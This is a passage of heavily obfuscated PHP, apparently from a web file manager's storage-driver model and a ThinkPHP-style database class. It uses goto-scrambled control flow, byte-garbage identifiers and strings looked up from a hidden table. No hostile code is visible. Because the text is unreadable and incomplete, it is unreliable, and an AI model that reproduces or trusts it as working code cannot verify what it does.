ÙîâƒŒ->setBucketCors()) { $F®ãùœ…Û  = LNG($eö¹‚ñ»Š¼[2005]); $F®ãùœ…Û  .= $eö¹‚ñ»Š¼[2006] . LNG($eö¹‚ñ»Š¼[2007]); if ($B‰Ğ‘¶¨’Ö) { return $F®ãùœ…Û ; } show_json($F®ãùœ…Û , !1); } } $DŒ¡Šª÷‡Â = rtrim($aöÁ“ƒ±×[$eö¹‚ñ»Š¼[1084]], $eö¹‚ñ»Š¼[8]) . $eö¹‚ñ»Š¼[8]; goto Eè‰ËõÜ½©; dåî§Á‘¸¾: $D‡¥¬Ÿó¬‰ = isset($Ağœ­¨­¦±[$eÇ‰¥¶¥]) ? $Ağœ­¨­¦±[$eÇ‰¥¶¥] : ucfirst($eÇ‰¥¶¥); $aôÆ¡âò”Ò = $eö¹‚ñ»Š¼[72] . $D‡¥¬Ÿó¬‰; if (!$D‡¥¬Ÿó¬‰ || !class_exists($aôÆ¡âò”Ò)) { if ($B‰Ğ‘¶¨’Ö) { return LNG($eö¹‚ñ»Š¼[2002]); } write_log(array($eö¹‚ñ»Š¼[2003], $BÖô‡¨ŒÜÚ, get_caller_info()), $eö¹‚ñ»Š¼[2004]); show_json(LNG($eö¹‚ñ»Š¼[2002]), !1, $BÖô‡¨ŒÜÚ); } goto fë‡ŸÙà; cÍ¡¨èï¤: $BÖô‡¨ŒÜÚ[$eö¹‚ñ»Š¼[6]] = json_encode($aöÁ“ƒ±×); $BÖô‡¨ŒÜÚ[$eö¹‚ñ»Š¼[94]] = $D‡¥¬Ÿó¬‰; return !0; goto D¢¸¶…‘ŠØ; Eè‰ËõÜ½©: $aÚ›§ŠŸ¥‚ = $b ÙîâƒŒ->getPath($DŒ¡Šª÷‡Â . $eö¹‚ñ»Š¼[1145]); if (!$b ÙîâƒŒ->mkfile($aÚ›§ŠŸ¥‚)) { if ($B‰Ğ‘¶¨’Ö) { return LNG($eö¹‚ñ»Š¼[2005]); } show_json(LNG($eö¹‚ñ»Š¼[2005]), !1); } $aöÁ“ƒ±×[$eö¹‚ñ»Š¼[1084]] = $DŒ¡Šª÷‡Â; goto cÍ¡¨èï¤; Fàñâœå: $eö¹‚ñ»Š¼ =& $_SERVER[úÉ·öƒÑì©]; $eÇ‰¥¶¥ = strtolower($BÖô‡¨ŒÜÚ[$eö¹‚ñ»Š¼[94]]); $aöÁ“ƒ±× = json_decode($BÖô‡¨ŒÜÚ[$eö¹‚ñ»Š¼[6]], !0); goto bÉ²ª‘“±ˆ; bÉ²ª‘“±ˆ: foreach ($aöÁ“ƒ±× as $D‚¡ÖÔÇØ => $aÁß¹´ñŸ­) { $aöÁ“ƒ±×[$D‚¡ÖÔÇØ] = trim($aÁß¹´ñŸ­); } $aöÁ“ƒ±×[$eö¹‚ñ»Š¼[2001]] = rand_string(6); $Ağœ­¨­¦± = $GLOBALS[$eö¹‚ñ»Š¼[6]][$eö¹‚ñ»Š¼[88]][$eö¹‚ñ»Š¼[807]]; goto dåî§Á‘¸¾; D¢¸¶…‘ŠØ: } public function driverListSystem() { $A·ÑáìˆÙœ =& $_SERVER[úÉ·öƒÑì©]; $a¤‰ì¼ ¥ = parent::listData(); $A¯„Ê­Ò¤¼ = array(); foreach ($a¤‰ì¼ ¥ as $E†¡à£†í‘) { unset($E†¡à£†í‘[$A·ÑáìˆÙœ[194]], $E†¡à£†í‘[$A·ÑáìˆÙœ[84]]); $E†¡à£†í‘[$A·ÑáìˆÙœ[6]] = json_decode($E†¡à£†í‘[$A·ÑáìˆÙœ[6]], !0); $A¯„Ê­Ò¤¼[] = $E†¡à£†í‘; } return $A¯„Ê­Ò¤¼; } public function defaultDriver() { $A´ÔÜä¨åÌ =& $_SERVER[úÉ·öƒÑì©]; $EÏ‚ˆÙƒĞ­ = parent::listData(); $FÄ–ÛÚø½± = array_filter_by_field($EÏ‚ˆÙƒĞ­, $A´ÔÜä¨åÌ[34], 1); $FÄ–ÛÚø½± = $FÄ–ÛÚø½±[0]; if ($FÄ–ÛÚø½±) { $FÄ–ÛÚø½±[$A´ÔÜä¨åÌ[6]] = json_decode($FÄ–ÛÚø½±[$A´ÔÜä¨åÌ[6]], !0); } return $FÄ–ÛÚø½±; } public function driverInfo($càß²‘ò±µ) { $eŒù®ïòİ =& $_SERVER[úÉ·öƒÑì©]; $b«†»æˆñô = array_to_keyvalue(parent::listData(), $eŒù®ïòİ[402]); if (!isset($b«†»æˆñô[$càß²‘ò±µ])) { return !1; } $bíÆ¡ÊÏ›ó = $b«†»æˆñô[$càß²‘ò±µ]; $bíÆ¡ÊÏ›ó[$eŒù®ïòİ[6]] = json_decode($bíÆ¡ÊÏ›ó[$eŒù®ïòİ[6]], !0); return $bíÆ¡ÊÏ›ó; } public function remove($dáÉŠ˜”™™) { $this->removeShareItems($dáÉŠ˜”™™); return parent::remove($dáÉŠ˜”™™); } public function removeWithFile($b²™ØÜñ¥¬, $c†•˜¤Ÿç) { goto d¢èÛõÁ¹œ; BÎŠÏÈä: $F¶ÌË¥ = Model($Dİ¢Õ–ˆÃÖ[193])->where($fÜ±‡†®ƒ)->field($Dİ¢Õ–ˆÃÖ[2010])->select(); foreach ($F¶ÌË¥ as $a´¦ç²’†£) { goto Aø‡¬¦šÛ×; CÍ•¶Äîã: if (IO::exist($cíˆ·©Ø³Ê)) { $AÊšÏ²Ô¸->updateFileEnd($a´¦ç²’†£[$Dİ¢Õ–ˆÃÖ[28]], $a´¦ç²’†£[$Dİ¢Õ–ˆÃÖ[78]]); continue; } if (!IO::move($FÏèªÕŠÜÁ, get_path_father($cíˆ·©Ø³Ê))) { $a¾Š¢ÊŞší = !1; break; } $fÜ±‡†®ƒ = array($Dİ¢Õ–ˆÃÖ[456] => $a´¦ç²’†£[$Dİ¢Õ–ˆÃÖ[456]]); goto cñ„Õˆâ¢Õ; cñ„Õˆâ¢Õ: $AÎÑ°–ĞÖİ = array($Dİ¢Õ–ˆÃÖ[798] => $cˆ£™‰â†ò, $Dİ¢Õ–ˆÃÖ[76] => $cíˆ·©Ø³Ê); Model($Dİ¢Õ–ˆÃÖ[193])->where($fÜ±‡†®ƒ)->save($AÎÑ°–ĞÖİ); goto aÑ—áÜ«•; Aø‡¬¦šÛ×: $FÏèªÕŠÜÁ = $a´¦ç²’†£[$Dİ¢Õ–ˆÃÖ[76]]; $cíˆ·©Ø³Ê = $Eîƒç’¢Å . str_replace("\x7b\x69\x6f\x3a{$b²™ØÜñ¥¬}\x7d\x2f", $Dİ¢Õ–ˆÃÖ[33], $FÏèªÕŠÜÁ); if (!IO::exist($FÏèªÕŠÜÁ)) { $eÑ“‡‚–Ÿ¹[] = $a´¦ç²’†£[$Dİ¢Õ–ˆÃÖ[456]]; $AÊšÏ²Ô¸->updateFileEnd($a´¦ç²’†£[$Dİ¢Õ–ˆÃÖ[28]], $a´¦ç²’†£[$Dİ¢Õ–ˆÃÖ[78]]); continue; } goto CÍ•¶Äîã; aÑ—áÜ«•: } $this->removeByFileID($eÑ“‡‚–Ÿ¹); goto a´…ƒÀšŒù; CİàîÒœ«‘: $Eîƒç’¢Å = "\x7b\x69\x6f\72{$cˆ£™‰â†ò}\175\x2f"; $a¾Š¢ÊŞší = !0; $eÑ“‡‚–Ÿ¹ = array(); goto BÎŠÏÈä; d¶Ü…‚ö›˜: $C´•†¢²‹‹ = Model($Dİ¢Õ–ˆÃÖ[459])->where($fÜ±‡†®ƒ)->sum($Dİ¢Õ–ˆÃÖ[78]); $BÈ²í¦Ôª„ = $c†•˜¤Ÿç . $Dİ¢Õ–ˆÃÖ[2008] . $b²™ØÜñ¥¬; $AÊšÏ²Ô¸ = new TaskFileTransfer($BÈ²í¦Ôª„, $Dİ¢Õ–ˆÃÖ[2004], $D…³Ğ˜ƒî¹, LNG($Dİ¢Õ–ˆÃÖ[2009]) . "\x28{$b²™ØÜñ¥¬}\51"); goto b ÷„ã¶²¦; a´…ƒÀšŒù: if (!$a¾Š¢ÊŞší) { $AÊšÏ²Ô¸->stop($BÈ²í¦Ôª„); return !1; } $AÊšÏ²Ô¸->end(); if ($c†•˜¤Ÿç == $Dİ¢Õ–ˆÃÖ[1665]) { $this->remove($b²™ØÜñ¥¬); } goto cÚø®–Ü; b ÷„ã¶²¦: $AÊšÏ²Ô¸->task[$Dİ¢Õ–ˆÃÖ[739]] = (double) $C´•†¢²‹‹; $fËš—®¯óÒ = KodIO::defaultDriver(); $cˆ£™‰â†ò = $fËš—®¯óÒ[$Dİ¢Õ–ˆÃÖ[402]]; goto CİàîÒœ«‘; d¢èÛõÁ¹œ: $Dİ¢Õ–ˆÃÖ =& $_SERVER[úÉ·öƒÑì©]; $fÜ±‡†®ƒ = array($Dİ¢Õ–ˆÃÖ[798] => $b²™ØÜñ¥¬); $D…³Ğ˜ƒî¹ = Model($Dİ¢Õ–ˆÃÖ[459])->where($fÜ±‡†®ƒ)->count(); goto d¶Ü…‚ö›˜; cÚø®–Ü: } public function progress($D–ÂäÓˆÚÑ, $B—®ÍÖßŸØ) { return Task::get($B—®ÍÖßŸØ . $_SERVER[úÉ·öƒÑì©][2008] . $D–ÂäÓˆÚÑ); } private function removeByFileID($B æ·õ½ö = array()) { goto BŸ’Ÿ”¨„—; CŠÊòæÖë: $D³è†Ÿ½†„ = Model($fŒšéë”è¢[1213])->where($Aí¸Œòßå)->field($fŒšéë”è¢[404])->select(); if (!$D³è†Ÿ½†„) { return; } $D³è†Ÿ½†„ = array_to_keyvalue($D³è†Ÿ½†„, $fŒšéë”è¢[33], $fŒšéë”è¢[404]); goto fòÔ±¬§£; BŸ’Ÿ”¨„—: $fŒšéë”è¢ =& $_SERVER[úÉ·öƒÑì©]; if (empty($B æ·õ½ö)) { return; } $Aí¸Œòßå = array($fŒšéë”è¢[456] => array($fŒšéë”è¢[7], $B æ·õ½ö)); goto CŠÊòæÖë; fòÔ±¬§£: foreach ($D³è†Ÿ½†„ as $EÀÖ±šÅ¶Ó) { Model($fŒšéë”è¢[418])->removeNow($EÀÖ±šÅ¶Ó, !1); } goto eŞñëäÁœê; eŞñëäÁœê: } private function removeShareItems($dÀ¶¡ ·Œ¶) { goto CÉ­Ğ²Óßº; d¼àìØ™®: $fÀÏªÄŒÏ = Model($d¯×– ÔÃä[1676])->where($F¿æŒïÔÙå)->field($d¯×– ÔÃä[477])->select(); if (empty($fÀÏªÄŒÏ)) { return; } $D¥ğ² ¨‰é = array_to_keyvalue($fÀÏªÄŒÏ, $d¯×– ÔÃä[33], $d¯×– ÔÃä[477]); goto FŸ¤®ÙšŠ; FŸ¤®ÙšŠ: Model($d¯×– ÔÃä[572])->remove($D¥ğ² ¨‰é); goto c™‹£ƒé; CÉ­Ğ²Óßº: $d¯×– ÔÃä =& $_SERVER[úÉ·öƒÑì©]; $Dİ×õ„ïĞê = "\x7b\x69\157\72{$dÀ¶¡ ·Œ¶}\x7d\x2f"; $F¿æŒïÔÙå = array($d¯×– ÔÃä[404] => 0, $d¯×– ÔÃä[1079] => array($d¯×– ÔÃä[389], "{$Dİ×õ„ïĞê}\x25")); goto d¼àìØ™®; c™‹£ƒé: } } goto c³½ëÔ¹¨é; AÚí¨§•å: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\151\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\75", "\156\145\161" => "\x3c\x3e", "\147\164" => "\76", "\145\x67\x74" => "\x3e\x3d", "\x6c\164" => "\x3c", "\145\x6c\164" => "\74\x3d", "\156\157\x74\154\x69\x6b\x65" => "\116\x4f\x54\40\114\111\x4b\105", "\154\x69\x6b\145" => "\x4c\x49\x4b\x45", "\151\156" => "\111\x4e", "\156\x6f\x74\x69\156" => "\116\x4f\124\40\111\x4e", "\156\157\164\40\151\x6e" => "\x4e\117\x54\40\111\116", "\x62\145\x74\167\x65\x65\x6e" => "\102\105\124\127\105\105\x4e", "\x6e\x6f\164\142\145\164\167\x65\145\x6e" => "\x4e\x4f\124\x20\x42\105\124\x57\x45\105\116", "\156\157\164\40\142\x65\164\x77\x65\x65\x6e" => "\x4e\117\124\x20\102\x45\x54\x57\x45\105\x4e"); protected $selectSql = "\x53\105\114\x45\103\124\45\104\111\123\124\111\116\x43\x54\45\40\x25\x46\111\x45\114\x44\x25\40\x46\122\x4f\x4d\40\45\124\x41\x42\114\105\45\x25\112\x4f\x49\116\x25\45\x57\110\x45\122\x45\x25\45\107\x52\117\125\120\45\45\x48\x41\126\111\116\x47\45\x25\x4f\x52\x44\105\x52\45\45\114\x49\115\x49\124\x25\40\45\x55\x4e\x49\117\x4e\x25\45\x43\117\x4d\115\105\116\x54\x25"; protected $bind = array(); public static function getInstance() { $föÉÃ·Ü‡ã = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[úÉ·öƒÑì©][927], $föÉÃ·Ü‡ã); } public function factory($fÆô±Á¿¿Ñ = '') { goto DéÖÏñê÷; FÃöéÅ¶…Œ: $this->dbType = ucwords(strtolower($fÆô±Á¿¿Ñ[$aö£³¿¡¯¶[928]])); $b‹ï¶Ã¦Òô = $aö£³¿¡¯¶[930] . $this->dbType; if (class_exists($b‹ï¶Ã¦Òô)) { $F§õˆÀÇòï = new $b‹ï¶Ã¦Òô($fÆô±Á¿¿Ñ); if ($aö£³¿¡¯¶[771] != strtolower($fÆô±Á¿¿Ñ[$aö£³¿¡¯¶[928]])) { $F§õˆÀÇòï->dbType = strtoupper($this->dbType); } else { $F§õˆÀÇòï->dbType = $this->_getDsnType($fÆô±Á¿¿Ñ[$aö£³¿¡¯¶[883]]); } } else { think_exception(think_lang($aö£³¿¡¯¶[931]) . $aö£³¿¡¯¶[932] . $b‹ï¶Ã¦Òô); } goto E×—àÈ¯; DéÖÏñê÷: $aö£³¿¡¯¶ =& $_SERVER[úÉ·öƒÑì©]; $fÆô±Á¿¿Ñ = $this->parseConfig($fÆô±Á¿¿Ñ); if (empty($fÆô±Á¿¿Ñ[$aö£³¿¡¯¶[928]])) { think_exception(think_lang($aö£³¿¡¯¶[929])); } goto FÃöéÅ¶…Œ; E×—àÈ¯: return $F§õˆÀÇòï; goto Cº‡•ãƒ½·; Cº‡•ãƒ½·: } public function __call($EğÇÆ¨ Ÿ, $cµ¡ƒ†—¯) { if (method_exists($this, $EğÇÆ¨ Ÿ)) { return call_user_func_array(array($this, $EğÇÆ¨ Ÿ), $cµ¡ƒ†—¯); } } protected function _getDsnType($A­ØŠÌâÕâ) { $D¸±İà¥ì = explode($_SERVER[úÉ·öƒÑì©][4], $A­ØŠÌâÕâ); $AØÔšˆãø· = strtoupper(trim($D¸±İà¥ì[0])); return $AØÔšˆãø·; } private function parseConfig($f¿…Ãµè† = '') { $F¦èƒ¡å·… =& $_SERVER[úÉ·öƒÑì©]; if (!empty($f¿…Ãµè†) && is_string($f¿…Ãµè†)) { $f¿…Ãµè† = $this->parseDSN($f¿…Ãµè†); } elseif (is_array($f¿…Ãµè†)) { $f¿…Ãµè† = array_change_key_case($f¿…Ãµè†); $f¿…Ãµè† = array($F¦èƒ¡å·…[928] => $f¿…Ãµè†[$F¦èƒ¡å·…[770]], $F¦èƒ¡å·…[856] => $f¿…Ãµè†[$F¦èƒ¡å·…[933]], $F¦èƒ¡å·…[857] => $f¿…Ãµè†[$F¦èƒ¡å·…[934]], $F¦èƒ¡å·…[854] => $f¿…Ãµè†[$F¦èƒ¡å·…[935]], $F¦èƒ¡å·…[855] => $f¿…Ãµè†[$F¦èƒ¡å·…[936]], $F¦èƒ¡å·…[17] => $f¿…Ãµè†[$F¦èƒ¡å·…[937]], $F¦èƒ¡å·…[883] => $f¿…Ãµè†[$F¦èƒ¡å·…[772]], $F¦èƒ¡å·…[13] => isset($f¿…Ãµè†[$F¦èƒ¡å·…[938]]) ? $f¿…Ãµè†[$F¦èƒ¡å·…[938]] : array()); } elseif (empty($f¿…Ãµè†)) { if (think_config($F¦èƒ¡å·…[939]) && $F¦èƒ¡å·…[771] != strtolower(think_config($F¦èƒ¡å·…[940]))) { $f¿…Ãµè† = $this->parseDSN(think_config($F¦èƒ¡å·…[939])); } else { $f¿…Ãµè† = array($F¦èƒ¡å·…[928] => think_config($F¦èƒ¡å·…[940]), $F¦èƒ¡å·…[856] => think_config($F¦èƒ¡å·…[941]), $F¦èƒ¡å·…[857] => think_config($F¦èƒ¡å·…[942]), $F¦èƒ¡å·…[854] => think_config($F¦èƒ¡å·…[943]), $F¦èƒ¡å·…[855] => think_config($F¦èƒ¡å·…[944]), $F¦èƒ¡å·…[17] => think_config($F¦èƒ¡å·…[253]), $F¦èƒ¡å·…[883] => think_config($F¦èƒ¡å·…[939]), $F¦èƒ¡å·…[13] => think_config($F¦èƒ¡å·…[945])); } } return $f¿…Ãµè†; } protected function initConnect($eºÏ°·Û¿ = true) { if (1 == think_config($_SERVER[úÉ·öƒÑì©][18])) { $this->_linkID = $this->multiConnect($eºÏ°·Û¿); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $fÙì©öåÊË => $f¤¬÷¦ëƒ¦) { $this->_linkID = $f¤¬÷¦ëƒ¦; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($Fºˆ†÷ë = false) { goto C°„¸ø¼Œ; dºâ×‰íÌÓ: $BïÉ†˜¬² = array($D‰ îíµìç[856] => isset($aØ´§æõÖ[$D‰ îíµìç[856]][$F°ë‡ÄêõÑ]) ? $aØ´§æõÖ[$D‰ îíµìç[856]][$F°ë‡ÄêõÑ] : $aØ´§æõÖ[$D‰ îíµìç[856]][0], $D‰ îíµìç[857] => isset($aØ´§æõÖ[$D‰ îíµìç[857]][$F°ë‡ÄêõÑ]) ? $aØ´§æõÖ[$D‰ îíµìç[857]][$F°ë‡ÄêõÑ] : $aØ´§æõÖ[$D‰ îíµìç[857]][0], $D‰ îíµìç[854] => isset($aØ´§æõÖ[$D‰ îíµìç[854]][$F°ë‡ÄêõÑ]) ? $aØ´§æõÖ[$D‰ îíµìç[854]][$F°ë‡ÄêõÑ] : $aØ´§æõÖ[$D‰ îíµìç[854]][0], $D‰ îíµìç[855] => isset($aØ´§æõÖ[$D‰ îíµìç[855]][$F°ë‡ÄêõÑ]) ? $aØ´§æõÖ[$D‰ îíµìç[855]][$F°ë‡ÄêõÑ] : $aØ´§æõÖ[$D‰ îíµìç[855]][0], $D‰ îíµìç[17] => isset($aØ´§æõÖ[$D‰ îíµìç[17]][$F°ë‡ÄêõÑ]) ? $aØ´§æõÖ[$D‰ îíµìç[17]][$F°ë‡ÄêõÑ] : $aØ´§æõÖ[$D‰ îíµìç[17]][0], $D‰ îíµìç[883] => isset($aØ´§æõÖ[$D‰ îíµìç[883]][$F°ë‡ÄêõÑ]) ? $aØ´§æõÖ[$D‰ îíµìç[883]][$F°ë‡ÄêõÑ] : $aØ´§æõÖ[$D‰ îíµìç[883]][0], $D‰ îíµìç[13] => isset($aØ´§æõÖ[$D‰ îíµìç[13]][$F°ë‡ÄêõÑ]) ? $aØ´§æõÖ[$D‰ îíµìç[13]][$F°ë‡ÄêõÑ] : $aØ´§æõÖ[$D‰ îíµìç[13]][0]); return $this->connect($BïÉ†˜¬², $F°ë‡ÄêõÑ); goto Fƒ³‘›‚Éğ; C°„¸ø¼Œ: $D‰ îíµìç =& $_SERVER[úÉ·öƒÑì©]; static $aØ´§æõÖ = array(); static $câòäŸì¶ = -1; goto Dğá‰½‚¥”; Dğá‰½‚¥”: if (empty($aØ´§æõÖ)) { foreach ($this->config as $CÔÓ†ù”‰Â => $Bï…ÓÅäµÅ) { $aØ´§æõÖ[$CÔÓ†ù”‰Â] = explode($D‰ îíµìç[47], $Bï…ÓÅäµÅ); } } if (think_config($D‰ îíµìç[946])) { if ($Fºˆ†÷ë) { $F°ë‡ÄêõÑ = floor(mt_rand(0, think_config($D‰ îíµìç[947]) - 1)); $câòäŸì¶ = $F°ë‡ÄêõÑ; } else { if (is_numeric(think_config($D‰ îíµìç[948]))) { $F°ë‡ÄêõÑ = think_config($D‰ îíµìç[948]); } else { $F°ë‡ÄêõÑ = floor(mt_rand(think_config($D‰ îíµìç[947]), count($aØ´§æõÖ[$D‰ îíµìç[854]]) - 1)); } } } else { $F°ë‡ÄêõÑ = floor(mt_rand(0, count($aØ´§æõÖ[$D‰ îíµìç[854]]) - 1)); $câòäŸì¶ = $F°ë‡ÄêõÑ; } $F°ë‡ÄêõÑ = $câòäŸì¶ !== -1 ? $câòäŸì¶ : $F°ë‡ÄêõÑ; goto dºâ×‰íÌÓ; Fƒ³‘›‚Éğ: } public function parseDSN($eÅ±º¢Œš) { $eŠßÅ¡®œš =& $_SERVER[úÉ·öƒÑì©]; if (empty($eÅ±º¢Œš)) { return !1; } $eïÏ¹¢ˆ¶÷ = parse_url($eÅ±º¢Œš); if ($eïÏ¹¢ˆ¶÷[$eŠßÅ¡®œš[174]]) { $F¦§Ûõ°²Ö = array($eŠßÅ¡®œš[928] => $eïÏ¹¢ˆ¶÷[$eŠßÅ¡®œš[174]], $eŠßÅ¡®œš[856] => isset($eïÏ¹¢ˆ¶÷[$eŠßÅ¡®œš[571]]) ? $eïÏ¹¢ˆ¶÷[$eŠßÅ¡®œš[571]] : $eŠßÅ¡®œš[33], $eŠßÅ¡®œš[857] => isset($eïÏ¹¢ˆ¶÷[$eŠßÅ¡®œš[949]]) ? $eïÏ¹¢ˆ¶÷[$eŠßÅ¡®œš[949]] : $eŠßÅ¡®œš[33], $eŠßÅ¡®œš[854] => isset($eïÏ¹¢ˆ¶÷[$eŠßÅ¡®œš[175]]) ? $eïÏ¹¢ˆ¶÷[$eŠßÅ¡®œš[175]] : $eŠßÅ¡®œš[33], $eŠßÅ¡®œš[855] => isset($eïÏ¹¢ˆ¶÷[$eŠßÅ¡®œš[176]]) ? $eïÏ¹¢ˆ¶÷[$eŠßÅ¡®œš[176]] : $eŠßÅ¡®œš[33], $eŠßÅ¡®œš[17] => isset($eïÏ¹¢ˆ¶÷[$eŠßÅ¡®œš[76]]) ? substr($eïÏ¹¢ˆ¶÷[$eŠßÅ¡®œš[76]], 1) : $eŠßÅ¡®œš[33]); } else { preg_match($eŠßÅ¡®œš[950], trim($eÅ±º¢Œš), $AàÉÏùê¶ğ); $F¦§Ûõ°²Ö = array($eŠßÅ¡®œš[928] => $AàÉÏùê¶ğ[1], $eŠßÅ¡®œš[856] => $AàÉÏùê¶ğ[2], $eŠßÅ¡®œš[857] => $AàÉÏùê¶ğ[3], $eŠßÅ¡®œš[854] => $AàÉÏùê¶ğ[4], $eŠßÅ¡®œš[855] => $AàÉÏùê¶ğ[5], $eŠßÅ¡®œš[17] => $AàÉÏùê¶ğ[6]); } $F¦§Ûõ°²Ö[$eŠßÅ¡®œš[883]] = $eŠßÅ¡®œš[33]; return $F¦§Ûõ°²Ö; } protected function debug() { $e†Üí…Ş»í =& $_SERVER[úÉ·öƒÑì©]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $e†Üí…Ş»í[951]; if (think_config($e†Üí…Ş»í[952])) { think_status($e†Üí…Ş»í[953]); think_trace($this->queryStr . $e†Üí…Ş»í[954] . think_status($e†Üí…Ş»í[20], $e†Üí…Ş»í[953], 6) . $e†Üí…Ş»í[955], $e†Üí…Ş»í[33], $e†Üí…Ş»í[956]); } } protected function parseLock($cŒÁ‡¢­  = false) { $e‘èîÚÃ =& $_SERVER[úÉ·öƒÑì©]; if (!$cŒÁ‡¢­ ) { return $e‘èîÚÃ[33]; } if ($e‘èîÚÃ[885] == $this->dbType) { return $e‘èîÚÃ[957]; } return $e‘èîÚÃ[958]; } protected function parseSet($BÃ×œÚ¸Ş) { $Cóœ“˜´Á =& $_SERVER[úÉ·öƒÑì©]; foreach ($BÃ×œÚ¸Ş as $BòÕ»À¿—Ú => $a›ëñ¥¹) { if (is_array($a›ëñ¥¹) && $Cóœ“˜´Á[304] == $a›ëñ¥¹[0]) { $CÉõ¸‡›§·[] = $this->parseKey($BòÕ»À¿—Ú) . $Cóœ“˜´Á[959] . $a›ëñ¥¹[1]; } elseif (is_scalar($a›ëñ¥¹) || is_null($a›ëñ¥¹)) { $CÉõ¸‡›§·[] = $this->parseKey($BòÕ»À¿—Ú) . $Cóœ“˜´Á[959] . $this->parseValue($a›ëñ¥¹); } } return $Cóœ“˜´Á[960] . implode($Cóœ“˜´Á[47], $CÉõ¸‡›§·); } protected function bindParam($AŸ‰æ‚¯¡, $eœï ‡²¸) { $this->bind[$_SERVER[úÉ·öƒÑì©][4] . $AŸ‰æ‚¯¡] = $eœï ‡²¸; } protected function parseBind($EëÈè½¸ò) { $EëÈè½¸ò = array_merge($this->bind, $EëÈè½¸ò); $this->bind = array(); return $EëÈè½¸ò; } function parseKey(&$F¯·÷ÌÔ³à, $FÓ¸ï¨¹äá = true) { if ($FÓ¸ï¨¹äá) { $F¯·÷ÌÔ³à = $this->parseKeyCheck($F¯·÷ÌÔ³à); } return $F¯·÷ÌÔ³à; } function parseKeyCheck($aíÁóîÈ„Õ) { $FØ‚‹õ„§í =& $_SERVER[úÉ·öƒÑì©]; $aíÁóîÈ„Õ = trim($aíÁóîÈ„Õ); if (!preg_match($FØ‚‹õ„§í[961], $aíÁóîÈ„Õ)) { think_exception($FØ‚‹õ„§í[962] . $aíÁóîÈ„Õ); } return $aíÁóîÈ„Õ; } protected function parseValue($fŠ™¤êØÇÁ) { $f”–®«‚ôÌ =& $_SERVER[úÉ·öƒÑì©]; if (is_string($fŠ™¤êØÇÁ)) { $fŠ™¤êØÇÁ = $f”–®«‚ôÌ[924] . $this->escapeString($fŠ™¤êØÇÁ) . $f”–®«‚ôÌ[924]; } elseif (isset($fŠ™¤êØÇÁ[0]) && is_string($fŠ™¤êØÇÁ[0]) && strtolower($fŠ™¤êØÇÁ[0]) == $f”–®«‚ôÌ[304]) { $fŠ™¤êØÇÁ = $this->escapeString($fŠ™¤êØÇÁ[1]); } elseif (is_array($fŠ™¤êØÇÁ)) { $fŠ™¤êØÇÁ = array_map(array($this, $f”–®«‚ôÌ[925]), $fŠ™¤êØÇÁ); } elseif (is_bool($fŠ™¤êØÇÁ)) { $fŠ™¤êØÇÁ = $fŠ™¤êØÇÁ ? $f”–®«‚ôÌ[87] : $f”–®«‚ôÌ[191]; } elseif (is_null($fŠ™¤êØÇÁ)) { $fŠ™¤êØÇÁ = $f”–®«‚ôÌ[103]; } return $fŠ™¤êØÇÁ; } protected function parseField($fãŒ§Ö£ìÕ) { $fÖ ƒËšä =& $_SERVER[úÉ·öƒÑì©]; if (is_string($fãŒ§Ö£ìÕ) && strpos($fãŒ§Ö£ìÕ, $fÖ ƒËšä[47])) { $fãŒ§Ö£ìÕ = explode($fÖ ƒËšä[47], $fãŒ§Ö£ìÕ); } if (is_array($fãŒ§Ö£ìÕ)) { $b•¿×¦ùÚÈ = array(); foreach ($fãŒ§Ö£ìÕ as $A”±¬×õ¡ => $FŒÉóß°¼) { if (!is_numeric($A”±¬×õ¡)) { $b•¿×¦ùÚÈ[] = $this->parseKey($A”±¬×õ¡, !1) . $fÖ ƒËšä[963] . $this->parseKey($FŒÉóß°¼); } else { $b•¿×¦ùÚÈ[] = $this->parseKey($FŒÉóß°¼); } } $d´à­‘ = implode($fÖ ƒËšä[47], $b•¿×¦ùÚÈ); } elseif (is_string($fãŒ§Ö£ìÕ) && !empty($fãŒ§Ö£ìÕ)) { $d´à­‘ = $fãŒ§Ö£ìÕ; } else { $d´à­‘ = $fÖ ƒËšä[182]; } return $d´à­‘; } protected function parseTable($e•¦àƒŒÈ¯) { $féˆŠ¿… =& $_SERVER[úÉ·öƒÑì©]; if (is_array($e•¦àƒŒÈ¯)) { $fƒÆ„ºµƒë = array(); foreach ($e•¦àƒŒÈ¯ as $côÙ¤ŠÅ‹£ => $dÏÒöèì‡) { if (!is_numeric($côÙ¤ŠÅ‹£)) { $fƒÆ„ºµƒë[] = $this->parseKey($côÙ¤ŠÅ‹£) . $féˆŠ¿…[50] . $this->parseKey($dÏÒöèì‡); } else { $fƒÆ„ºµƒë[] = $this->parseKey($côÙ¤ŠÅ‹£); } } $e•¦àƒŒÈ¯ = $fƒÆ„ºµƒë; } elseif (is_string($e•¦àƒŒÈ¯)) { if (strstr($e•¦àƒŒÈ¯, $féˆŠ¿…[50])) { return $e•¦àƒŒÈ¯; } $e•¦àƒŒÈ¯ = explode($féˆŠ¿…[47], $e•¦àƒŒÈ¯); array_walk($e•¦àƒŒÈ¯, array($this, $féˆŠ¿…[874])); } return $féˆŠ¿…[868] . trim(implode($féˆŠ¿…[964], $e•¦àƒŒÈ¯), $féˆŠ¿…[391]) . $féˆŠ¿…[868]; } protected function parseWhere($c¬‡Û‹›®‰) { $a„‹ë¦”‚Ä =& $_SERVER[úÉ·öƒÑì©]; $a¾“ßÍ£’£ = $a„‹ë¦”‚Ä[33]; if (is_string($c¬‡Û‹›®‰)) { $a¾“ßÍ£’£ = $c¬‡Û‹›®‰; } else { $dÀ‡îÏÄá = isset($c¬‡Û‹›®‰[$a„‹ë¦”‚Ä[965]]) ? strtoupper($c¬‡Û‹›®‰[$a„‹ë¦”‚Ä[965]]) : $a„‹ë¦”‚Ä[33]; if (in_array($dÀ‡îÏÄá, array($a„‹ë¦”‚Ä[966], $a„‹ë¦”‚Ä[967], $a„‹ë¦”‚Ä[968]))) { $dÀ‡îÏÄá = 